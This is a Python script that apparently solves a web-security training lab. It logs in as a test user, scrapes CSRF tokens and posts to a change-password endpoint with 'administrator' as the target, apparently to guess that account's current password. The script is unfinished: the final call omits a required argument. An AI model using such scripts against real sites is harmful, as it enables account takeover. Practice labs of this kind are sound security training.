import requests
import bs4

DOMAIN = "0aac00bb04e91f718175702000d90095.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": ""
}

def get_initial_session():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0]  + ";"

def get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def login():
    get_initial_session()
    csrf_token = get_csrf_token_login()
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)

    if "Your username is" in response.text:
        print("Logged in successfully")
        print("COOKIES: ", response.request.headers["Cookie"])

    HEADERS["Cookie"] = response.request.headers["Cookie"]

def get_csrf_token_myaccount():
    response = requests.get(f"https://{DOMAIN}/my-account?id=wiener", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def change_email(current_password):
    csrf_token = get_csrf_token_myaccount()
    # csrf=IfJqRpd4GNYIaNXrd6Q23y6y4CKIXdPK&username=administrator&current-password=password&new-password-1=peter&new-password-2=peter
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "current-password": current_password,
        "new-password-1": "peter",
        "new-password-2": "peter"
    }

    response = requests.post(f"https://{DOMAIN}/my-account/change-password", headers=HEADERS, data=data)
    soup = bs4.BeautifulSoup(response.text, "html.parser")

    error = soup.find_all("p", class_="is-warning")

    if  "Current password is incorrect" in error[0].text:
        print("Current password is incorrect")
        return "Current password is incorrect"
    
    print(response.text)


login()
change_email()